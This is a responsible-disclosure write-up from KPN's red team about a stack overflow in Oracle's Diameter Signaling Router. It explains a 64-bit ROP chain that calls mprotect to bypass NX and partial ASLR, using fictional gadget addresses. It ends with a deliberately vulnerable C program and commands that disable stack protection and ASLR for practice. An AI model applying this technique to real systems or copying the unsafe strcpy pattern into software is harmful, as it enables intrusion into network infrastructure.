# Security vulnerabilities in Oracle DSR

### KPN CISO REDteam
KPN is a telecom operator located in the Netherlands. The CISO REDteam was introduced in 2013 and is KPN’s ethical hacking team. This team is involved in security tests of KPN applications and
services to ensure that our customers’ data is safe from unauthorized access, modification and data loss.

### Diameter Routing Agent background
KPN operates the largest mobile network in the Netherlands. One of the components of the 4G network that KPN operates is the Diameter Routing Agent application named Oracle Diameter Signalling Router (DSR). The Diameter Routing Agent (DRA) is a functional element in a 3G or 4G network that provides real-time routing capabilities to ensure that messages are routed among the correct elements in a network. The [3GPP] introduced the DRA to address the increased volume of Diameter signaling traffic and growing complexity of 4G LTE networks. It can be deployed either as a core router that routes traffic between Diameter elements in the home network, or as a gateway router that routes traffic between Diameter elements in the home and roaming network. The 3GPP specifies use of the Diameter protocol for a number of interfaces, including one (S6a) that is used for MME-HSS communication as well as roaming.

The picture below shows a typical DRA deployment in a LTE environment.
All interfaces between the elements are S6a interfaces.

![alt text](https://raw.githubusercontent.com/KPN-CISO/DRA_writeup/master/LTE_roaming.PNG "LTE roaming setup")

- [PLMN] = public land mobile network
- [IPX] = IP eXchange 
- [HSS] = Home Subscriber Server
- [MME] = Mobile Management Entity

The Oracle DSR is a cluster of machines running on CentOS linux that performs the DRA function. It is usually connected to different MME's and a HSS in the home LTE network, but could also be connected to roaming partners via the IPX network.

### Vulnerabilities
By using the [Codenomicon] DEFENSICS platform the KPN REDteam discovered two major vulnerabilities in the Oracle DSR application version 5.0: 
- A stack buffer overflow [CVE-2014-6598] in the dsr process.
- An SCTP kernel crash, which was previously reported and fixed under [CVE-2014-0101].

The first vulnerability allows an unauthenticated remote attacker connected to the IPX network to completely compromise the DRA and it's components. When an attacker gained full control over the DRA system he is able to monitor all traffic routed through the DRA, and possibly further infiltrate the telecom operator's core network.

### Responsible Disclosure Time-line
- 2014-07-24 : Reported the vulnerabilities to Oracle.
- 2014-10-21 : Security Patch released to the telco's that use the affected DSR.
- 2015-01-20 : Pubic release by Oracle in their Critical Patch Update ([CPU]).
- 2015-01-29 : Publication of this writeup.

### Conclusion
Oracle took the reported vulnerabilities seriously, and the KPN REDteam worked closely with Oracle to resolve these issues which was also stated in their customer advisory: 
> "Recent security tests have identified two security vulnerabilities in versions of the Oracle Diameter Signaling Router product.  To protect your network from potential exploits of these vulnerabilities, Oracle strongly recommends that you apply actions described herein without delay. Oracle acknowledges Frank Cozijnsen, Ethical Hacker, KPN CISO REDteam for discovery of the Diameter Stack vulnerability described below.  Special thanks is extended to KPN for their support during the Oracle analysis phase.  Note: These findings will be publicly disclosed with Oracle’s next planned CPU scheduled for January 20, 2015."

The found issues pose a serious threat to telecom operators that use Oracle's DSR and could be exploited by any attacker with access to an IPX connection.
 
### Test approach
The KPN REDteam tests products and services before they are deployed in production networks. As part of an upgrade project, the Oracle DSR version 5.0 was tested from a security perspective by the KPN REDteam. The security test included fuzzing of the Oracle DSR DIAMETER implementation by using the *Codenomicon Diameter Server test Suite*. The Capabilities Exchange Request (CER) message, which is used to check the DIAMETER capabilities of the receiving server, was used as initial fuzzing target. This message was chosen because it isn't forwarded to other systems such as the HSS, but is handled by the DSR itself. While fuzzing, several crashes of the "dsr" process were noticed on the Message Processor (MP) blades of the DSR.

### Technical details
Using GDB with the [PEDA] plug-in the crash was analyzed, and eventually a remote exploit was written. The crash was caused by an out of bounds write beyond the end of buffer located on the stack. The out of bounds write corrupted the stack with user controlled data. Also the saved return pointer, which is the address to where the program returns after returning from a function, was overwritten. When this return pointer can be controlled by the attacker, it can lead to arbitrary code execution.

![alt text](https://raw.githubusercontent.com/KPN-CISO/DRA_writeup/master/Crash.png "Crash in GDB")

The main reason for writing this blog is to explain how the KPN REDteam managed to get past the ASLR and NX protections in place, and managed to create a working remote code execution exploit. Normally ASLR and NX protection mechanisms are not a big obstacle for attackers, but the DSR is running on 64bit CentOS. There is not much practical documentation about Return Oriented Programming (ROP) on 64bit ASLR protected Linux systems.

During debugging it was noticed that the libc library was always mapped to the same address in the dsr process, and the address did not change after a reboot. Other libraries were mapped at random memory addresses in the dsr process. Knowing the libc memory address allows the use of libc as a source for the ROP gadgets. Another option is to use the *dsr* binary itself as a source for ROP gadgets, but the amount of usefull gadgets in that file is limited.


#### **mprotect()**
To bypass the NX protection the mprotect() function could be used to make the stack executable, and to be able to execute our shellcode.

The mprotect() function needs the following values in the corresponding registers:
- %RDI contains the memory offset of the region that will be changed (on a page boundary).
- %RSI contains the size of the memory region to be changed.
- %RDX contains the permissions bit, in our case 0x7 -> rwx permissions.

If all these registers are set, mprotect() can be called at offset 0xe54b0 in the target version of the libc library.


#### **ROP chain**
The following part of the document assumes knowledge about ROP, and the way it works. There is a nice example of creating a ROP chain on a 32 bit Linux system at [shell-storm.org].
Due to the "partial" ASLR, the location of the stack itself was not predictable. ROP gadgets were used to store the stack pointer (%RSP) value into the %RSI register.


#### **Step 1**
*Register %RDI must contain the memory offset of the memory region that needs to be made executable.*

The stack pointer can be used to determine this memory address, and it has to be set to a memory page boundary. The XOR instruction can be used to zero the last 4 bytes of this address to match a page boundary. There was only a gadget available to do this for the %RAX register, so the first step is to get the stack pointer value into the %RAX register.

The KPN REDteam does not want to disclose too much information about the actual exploit yet, so the addresses used below are fictional. They do however provide an idea in what sequence the instructions need to be executed.

First the stack pointer is stored in a register. The %RSI register is chosen because there are no gadgets available in the libc binary to store the value directly in the %RAX register.

```python
The following ROP gadgets were used:
	- 0x00000039c1111111 : pop rcx ; ret 
	- 0x00000039c2222222 : pop rdx ; pop rsi ; ret
	- 0x00000039c3333333 : push rsp ; and al, 8 ; call rcx
	- 0x00000039c4444444 : mov rax, rsi ; ret


Before the overflow the registers look like this:
	%RAX	0x1e40
	%RCX 	0x3ad
	%RDX	0x0
	%RSI	0x0
	%RDI	0x49b8970
	%RSP	0x7fdb97abaaaa

The first objective is to get the value in %RSP to %RSI.

This results in the following first section of the payload: 
	[NOP x size][0x00000039c1111111][0x00000039c2222222][0x00000039c3333333][0x00000039c4444444]
```

The first instruction that is executed is "pop rcx" which loads 0x00000039c2222222 in the %RCX register. The pop instruction also moves the stack pointer to the place where 0x00000039c3333333 is stored. This will be the address of the next ROP gadget: "push rsp ; and al, 8 ; call rcx". The push rsp instruction pushes the stack pointer to the stack, and after that the address that was previously stored in the %RCX register will be called. This loads two values from the stack in subsequently the %RDX and %RSI registers, and returns to the address 0x00000039c4444444. The %RSI register now contains the previously stored stack pointer. The ROP gadget located at address 0x00000039c4444444 copies the value stored in %RSI to %RAX.

The pointer into our stack in the %RAX register can now be used to change permissions for the memory map on the stack. For zeroing the last 4 bytes we use a XOR instruction that only applies on the last 4 bytes of the %RAX register:

```python
Current values of the registers:
	%RAX 	0x7fdb97abaaaa
	%RCX 	0x00000039c2222222
	%RDX	0x7fdb97abaab2
	%RSI	0x7fdb97abaaaa
	%RDI	0x49b8970

XOR the last 4 bytes of %RAX
	0x00000039c6666666 : xor ax, ax ; ret

The registers now contain:
	%RAX 	0x7fdb97ab0000
	%RCX 	0x00000039c2222222
	%RDX	0x7fdb97abaab2
	%RSI	0x7fdb97abaaaa
	%RDI	0x49b8970
```

Next step is to put the value from %RAX into %RDI:

```python
The following ROP gadgets are used:
	- 0x00000039c6666666 : pop rdx ; ret
	- 0x00000039c7777777 : xor al, 0x41 ; pop rdi ; ret
	- 0x00000039c8888888 : push rax ; and bh, al ; jmp rdx

The way these instructions interact with each other is similar to the previously explained instructions.

The payload now looks like this:
	[NOP x size][0x00000039c1111111][0x00000039c2222222][0x00000039c3333333][0x00000039c4444444]
	[0x00000039c5555555][0x00000039c6666666][0x00000039c7777777][0x00000039c8888888]

This results in the following register content:
	%RAX 	0x7fdb97ab0000
	%RCX 	0x00000039c2222222
	%RDX	0x00000039c7777777
	%RSI	0x7fdb97abaaaa
	%RDI	0x7fdb97ab0000
```

The %RDI register now contains a memory offset on the stack that is limited to a page boundary.

#### **Step 2**
*The %RSI register must contain the size of the memory region that needs to be changed.*

This is an easy one, just put the size in %RSI.

```python
Only one gadget is used, together with the size.
	- 0x00000039c9999999 : pop rsi ; ret

The size (0xf0000) will be popped from the stack and therefore it has to be added to the payload.

The payload now looks like this:
	[NOP x size][0x00000039c1111111][0x00000039c2222222][0x00000039c3333333][0x00000039c4444444]
	[0x00000039c5555555][0x00000039c6666666][0x00000039c7777777][0x00000039c8888888]
	[0x00000039c9999999][0x00000000000f0000]

The registers now contain:
	%RAX 	0x7fdb97ab0000
	%RCX 	0x00000039c2222222
	%RDX	0x00000039c7777777
	%RSI	0xf0000
	%RDI	0x7fdb97ab0000
```

#### **Step 3**
*The %RDX register must contain the permissions bit, in our case 0x7 -> rwx permissions.* 

This step is similar to the previous step. The value will be popped from the stack:

```python
Only one gadget is used, together with the permissions setting.
	- 0x00000039caaaaaaa: pop rdx ; ret

The permissions value is 0x7 (read, write and execute permissions)

The payload now looks like this:
	[NOP x size][0x00000039c1111111][0x00000039c2222222][0x00000039c3333333][0x00000039c4444444]
	[0x00000039c5555555][0x00000039c6666666][0x00000039c7777777][0x00000039c8888888]
	[0x00000039c9999999][0x00000000000f0000][0x00000039caaaaaaa][0x0000000000000007]

The registers now contain:
	%RAX 	0x7fdb97ab0000
	%RCX 	0x00000039c2222222
	%RDX	0x00000039c7777777
	%RSI	0x7
	%RDI	0x7fdb97ab0000

```

**All registers now have the correct value to make this part of the stack executable.**

#### **Step 4**
*Call mprotect()*


The address of the mprotect() instruction must be included in the payload.
For this example libc is loaded on address 0x0000003888c00000, so the payload that will make the stack executable looks like this:
```python
	[NOP x size][0x00000039c1111111][0x00000039c2222222][0x00000039c3333333][0x00000039c4444444]
	[0x00000039c5555555][0x00000039c6666666][0x00000039c7777777][0x00000039c8888888]
	[0x00000039c9999999][0x00000000000f0000][0x00000039caaaaaaa][0x0000000000000007]
	[0x0000003888ce54b0]
```

That's all. To finish the exploit you still have to make sure that your instruction pointer points to your shellcode, but that is easy after the given explanation.

## Do it yourself
Building a ROP chain and testing how things work can easily be done on a 64-bit Linux machine.
To try it yourself you could write a vulnerable C program:
```c
#include <string.h> 
#include <stdio.h> 

void print_name(char *Buffer)
{
     char name[64];
     strcpy(name,Buffer);
     printf("Hi, %s!\n", Buffer);
}

int main (int argc, char **argv)
{
     print_name(argv[1]);
}

```
Compile this program without the Stack Smashing Protection (SSP)
```sh
$ gcc -fno-stack-protector -o exploitme exploitme.c
```
For testing, make sure to temporarily disable ASLR:
```sh
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Now fire up your GDB and start hacking..

In GDB, run this file by using the following argument:
```sh
run `perl -e'print "\x41" x500'`
```
The [PEDA] plug-in for GDB makes life a lot easier, and will help to find your ROP gadgets.

[S6a]:http://www.developingsolutions.com/products/s6-interface/
[3GPP]:http://en.wikipedia.org/wiki/3GPP
[PLMN]:http://en.wikipedia.org/wiki/Public_land_mobile_network
[IPX]:http://en.wikipedia.org/wiki/IP_exchange
[HSS]:http://en.wikipedia.org/wiki/IP_Multimedia_Subsystem#HSS_.E2.80.93_Home_Subscriber_Server
[MME]:http://en.wikipedia.org/wiki/System_Architecture_Evolution#MME_.28Mobility_Management_Entity.29_protocols
[Codenomicon]:http://www.codenomicon.com/products/defensics/
[shell-storm.org]:http://shell-storm.org/blog/Return-Oriented-Programming-and-ROPgadget-tool/
[PEDA]:https://github.com/longld/peda
[CVE-2014-0101]:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0101
[CVE-2014-6598]:https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6598
[CPU]:http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html#AppendixCGBU

